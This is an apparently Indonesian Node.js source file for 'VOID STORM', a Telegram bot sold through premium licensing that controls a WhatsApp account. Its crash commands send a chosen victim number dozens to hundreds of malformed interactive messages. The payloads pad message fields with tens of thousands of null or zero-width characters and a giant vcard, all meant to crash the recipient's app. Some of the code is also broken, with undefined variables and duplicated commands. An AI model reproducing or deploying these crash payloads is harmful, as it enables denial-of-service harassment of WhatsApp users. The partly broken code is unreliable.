const { Telegraf } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./zepsettings/zepconfig");
const moment = require('moment-timezone');

// ======== [ GITHUB INTEGRATION MVII ] =================
const developerId = "7886419837";
const developerIds = [developerId, "7886419837", "7886419837", "8013537588", "7980639452", "6784537092",
  "7767967006", "5919811395", "6702761481", "7682525029", "7262570559",
  "1095238125", "7248260119", "7957150402", "1463443914", "6879723503",
  "1903797644", "8033687996", "7556067800", "6756117997", "5029180531",
  "1688345559", "6640656679", "7779516259", "6987550556", "7125367458",
  "7201248947", "7764053035", "7560016164", "5617082980", "7642065030",
  "6940286591", "5414237939", "5845111113", "7474142408", "7642351795",
  "7297140465", "6719164406", "5906710596", "5798020192", "6839205563",
  "6904451698", "7725644625", "7401472796", "5082955178", "7528333001",
  "6952074913", "7543056599", "7712826624", "8104638615", "5883640623",
  "6484894681", "6405831736", "7807910396", "1019706973", "5952994177",
  "5835347198", "7910563050", "8059947436", "7198887810", "7818948690",
  "7748127555", "7701771105", "7759986530", "8169047682", "7303513739",
  "6310792205", "8188491059", "6898950005", "7577795966", "6990441946",
  "7818948690", "7669269994", "6742099774", "7837419631", "6859968645",
  "7974725720", "7857021468", "7794514210", "7542173838", "1668602193", "1201525292", "7922590678", "7886419837"]; 


async function loadOctokit() {
    const { Octokit } = await import('@octokit/rest');
    return new Octokit({ auth: githubToken });
}
//============================================S

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function getGitHubData(path) {
    const octokit = await loadOctokit();
    try {
        const response = await octokit.repos.getContent({
            owner,
            repo,
            path,
        });
        const content = Buffer.from(response.data.content, 'base64').toString();
        return { data: JSON.parse(content), sha: response.data.sha };
    } catch (error) {
        console.error("Error fetching :", error);
        return { data: null, sha: null };
    }
}

async function updateGitHubData(path, content, sha) {
    const octokit = await loadOctokit();
    try {
        await octokit.repos.createOrUpdateFileContents({
            owner,
            repo,
            path,
            message: `Update`,
            content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
            sha,
        });
        console.log(`updated successfully.`);
    } catch (error) {
        console.error("Error updating data on GitHub:", error);
    }
}

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363210705976689@newsletter',
    newsletterName: '',
    caption: 'Zephyrine'
}}}

// ========================= [ TOKEN MANAGEMENT ] =========================

async function addToken(newToken) {
    const { data: tokens, sha } = await getGitHubData(tokenPath);
    if (tokens) {
        tokens.push(newToken);
        await updateGitHubData(tokenPath, tokens, sha);
    }
}

async function deleteToken(tokenToDelete) {
    const { data: tokens, sha } = await getGitHubData(tokenPath);
    if (tokens) {
        const updatedTokens = tokens.filter(token => token !== tokenToDelete);
        await updateGitHubData(tokenPath, updatedTokens, sha);
    }
}

async function isValidToken(token) {
    const { data: tokens } = await getGitHubData(tokenPath);
    return tokens && tokens.includes(token);
}

// ========================= [ MODERATOR MANAGEMENT ] =========================

async function isModerator(userId) {
    const { data: moderators } = await getGitHubData(moderatorsPath);
    return moderators && moderators.includes(userId);
}

async function addModerator(userId) {
    const { data: moderators, sha } = await getGitHubData(moderatorsPath);
    if (moderators && !moderators.includes(userId)) {
        moderators.push(userId);
        await updateGitHubData(moderatorsPath, moderators, sha);
    }
}

async function deleteModerator(userId) {
    const { data: moderators, sha } = await getGitHubData(moderatorsPath);
    if (moderators) {
        const updatedModerators = moderators.filter(id => id !== userId);
        await updateGitHubData(moderatorsPath, updatedModerators, sha);
    }
}
// ========================= [ BOT INITIALIZATION ] =========================

const bot = new Telegraf(tokenBot);
let zep = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// ========================= [ UTILITY FUNCTIONS ] =========================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


// ========================= [ PREMIUM USER MANAGEMENT ] =========================

const premiumFile = './データベース/premiumvip.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

// ========================= [ BAILEYS CONNECTION ] =========================

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    zep = makeWASocket(connectionOptions);
    
    zep.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                console.log("⚠️ Tidak ada pesan masuk.");
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

            console.log(`ID SALURAN : ${chatId}`);
        } catch (error) {
            console.error("❌ Error membaca pesan:", error);
        }
    });
    
    if (usePairingCode && !zep.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.white(`\nINPUT YOUR NUMBER SENDER !\n`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await zep.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.bold.white(`YOUR CODE `), chalk.bold.white(formattedCode));
    }

    zep.ev.on('creds.update', saveCreds);
    store.bind(zep.ev);

    zep.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.white(`
Script: VOID STORM INC
Versi: 12.0
Status: `) + chalk.bold.green('Terhubung') + chalk.bold.white(`
Developer: Zephyrine
Telegram: @cursezep
Waktu: ${currentTime} WIB`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();


// ========================= [ MIDDLEWARE ] =========================

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("Nomor sender tidak di temukan atau tidak terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ Maaf, fitur ini hanya untuk pengguna premium.");
        return;
    }
    next();
};

// ========================= [ TOKEN MANAGEMENT COMMANDS (Only for Developers) ] =========================

bot.command('addtoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Berhasil menambahkan token: ${newToken}`);
});

bot.command('deltoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Berhasil menghapus token: ${tokenToDelete}`);
});

// ========================= [ PREMIUM USER MANAGEMENT COMMANDS ] =========================

// /addprem command
bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("Durasi harus berupa angka (dalam hari).");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai pengguna premium hingga ${expiryDate}`);
});

// /delprem command
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar pengguna premium.`);
});

// /cekprem command
bot.command('cekprem', async (ctx) => {
    const userId = ctx.from.id;
    if (isPremiumUser(userId)) {
        const expiryDate = loadPremiumUsers()[userId];
        ctx.reply(`✅ Anda adalah pengguna premium hingga ${expiryDate}`);
    } else {
        ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// /listprem command
bot.command('listprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const premiumUsers = loadPremiumUsers();
    let message = "<b>Daftar Pengguna Premium:</b>\n";
    for (const userId in premiumUsers) {
        const expiryDate = premiumUsers[userId];
        message += `\n- ${userId}: ${expiryDate}`;
    }
    if (message === "<b>Daftar Pengguna Premium:</b>\n") {
        message = "Tidak ada pengguna premium.";
    }
    ctx.reply(message, { parse_mode: 'HTML' });
});

// ========================= [ MODERATOR MANAGEMENT COMMANDS ] =========================

bot.command('addmoderatorid', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addmoderatorid [user_id]");
    }
    const userId = args[1];
    await addModerator(userId);
    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai moderator.`);
});

bot.command('delmoderatorid', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delmoderatorid [user_id]");
    }
    const userId = args[1];
    await deleteModerator(userId);
    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar moderator.`);
});

// ========================= [ START MESSAGE AND MENU ] =========================

bot.start(ctx => {
    const menuMessage = `
<blockquote>
<b>╭━━━[ VOID STORM ]</b>
<b>┃ Developer : Zephyrine</b>
<b>┃ Version : 12.0</b>
<b>┃ Language : commonJs</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ USER INFO ]</b>
<b>┃ Pengguna : ${ctx.from.first_name}</b>
<b>┃ Sender : ${isWhatsAppConnected ? '✅' : '❌'}</b>
<b>┃ Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}</b>
<b>┃ Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ CURSED TECHNIQUE ]</b>
<b>┃ /crashjids</b>
<b>┃ /crashperma</b>
<b>┃ /invisiblecrash</b>
<b>┃ /malefic</b>
<b>┃ /crashapp</b>
<b>╰━━━━━━━━━━━━━━❍</b>
</blockquote>
`;

    const photoUrl = "https://files.catbox.moe/oee8rm.jpg";

    const keyboard = [
        [
            {
                text: "CONTROLS (🚯)",
                callback_data: "/menu"
            }
        ]
    ];

    ctx.replyWithPhoto(photoUrl, {
        caption: menuMessage,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ========================= [ OWNER MENU ] =========================

bot.action('/menu', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, menu ini hanya untuk owner.");
    }

    const ownerMenu = `
<b>╭━━━[ OWNER MENU ]</b>
<b>┃ /addprem [user_id] [duration_in_days]</b>
<b>┃ /delprem [user_id]</b>
<b>┃ /cekprem</b>
<b>┃ /listprem</b>
<b>┃ /addtoken [token_bot]</b>
<b>┃ /deltoken [token_bot]</b>
<b>┃ /addmoderatorid [user_id]</b>
<b>┃ /delmoderatorid [user_id]</b>
<b>╰━━━━━━━━━━━━━━━━━━━❍</b>
    `;

    const keyboard = [
        [
            {
                text: "Back to Main Menu",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(ownerMenu, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        console.error("Error updating message:", error);
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
            console.log("Message is not modified. Skipping update.");
            await ctx.answerCbQuery();
        } else {
            await ctx.reply("Terjadi Overload Silahkan Coba Lagi");
        }
    }
});

// ========================= [ BACK TO START HANDLER ] =========================

bot.action('/start', async (ctx) => {
    const menuMessage = `
<blockquote>
<b>╭━━━[ VOID STORM ]</b>
<b>┃ Developer : Zephyrine</b>
<b>┃ Version : 12.0</b>
<b>┃ Language : commonJs</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ USER INFO ]</b>
<b>┃ Pengguna : ${ctx.from.first_name}</b>
<b>┃ Sender : ${isWhatsAppConnected ? '✅' : '❌'}</b>
<b>┃ Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}</b>
<b>┃ Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ CURSED TECHNIQUE ]</b>
<b>┃ /crashjids</b>
<b>┃ /crashperma</b>
<b>┃ /invisiblecrash</b>
<b>┃ /malefic</b>
<b>┃ /crashapp</b>
<b>╰━━━━━━━━━━━━━━❍</b>
</blockquote>
`;

    const photoUrl = "https://files.catbox.moe/cg1bdf.jpg";

    const keyboard = [
        [
            {
                text: "CONTROLS (🚯)",
                callback_data: "/menu"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: photoUrl,
            caption: menuMessage,
            parse_mode: 'HTML',
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        console.error("Error updating message:", error);
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
            console.log("Message is not modified. Skipping update.");
            await ctx.answerCbQuery();
        } else {
            await ctx.reply("Terjadi Overload Silahkan Coba Lagi");
        }
    }
});
// ========================= [ TELEGRAM BOT COMMANDS ] =========================

bot.command('addtoken', async (ctx) => {
    if (ctx.from.id != developerId) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Token berhasil ditambahkan.`);
});

bot.command('deltoken', async (ctx) => {
    if (ctx.from.id != developerId) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Token berhasil dihapus.`);
}); 

bot.command("crashjids", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 50; i++) {
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("invisiblecrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 70; i++) {
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashperma", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashapp", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await pendingpay(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("malefic", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await vcardcrash(target);
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

async function payoutzep(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "CAPSLOCK 🐉🐉🐉"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await zep.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function buttoncast(target) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `order_${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER"
        },
        share_payment_status: true
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: buttons,
        messageParamsJson: {
          title: "(🐉) CAST ( ONE ZEP )",
          body: "ZEP SCHEMA 🐉🐉🐉"
        }
      }
    }
  }, { userJid: target });

  await zep.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

// CRASH APPLICATION

async function pendingpay(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending",
                order_type: "ORDER"
              },
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u0000".repeat(70000), 
          body: "🐉🐉🐉"
        })
      }
    }
  }, { userJid: bijipler });

  await Zeph.relayMessage(bijipler, msg.message, { 
    messageId: msg.key.id
  });
}

async function vcardcrash(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending", 
                order_type: "ORDER"
              },
              share_payment_status: true,
              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "Zephyrine Chema ".repeat(4000),
                phone_number: "+628217973312",
                email: "zephyrineexploit@iCloud.com",
                organization: "Zephyrine Exploiter",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u200B".repeat(10000), 
          body: "GIDEOVA_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await zep.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}


// - Last Case © Zephyrine

// ========================= [ LAUNCH BOT ] =========================

(async () => {
    if (!(await isValidToken(tokenBot))) {
        console.error(chalk.red.bold("--------------------------------------------------"));
        console.error(chalk.red.bold("|                 PERINGATAN !               |"));
        console.error(chalk.red.bold("|  ANDA TERDETEKSI SEBAGAI PENYUSUP!           |"));
        console.error(chalk.red.bold("|  Token bot yang Anda gunakan tidak terdaftar.  |"));
        console.error(chalk.red.bold("|  Silakan hubungi developer untuk            |"));
        console.error(chalk.red.bold("|  mendaftarkan token Anda.                     |"));
        console.error(chalk.red.bold("--------------------------------------------------"));
        process.exit(1);
    }
    bot.launch().then(() => {
        console.log("Running in pterodactyl");
    });
})();

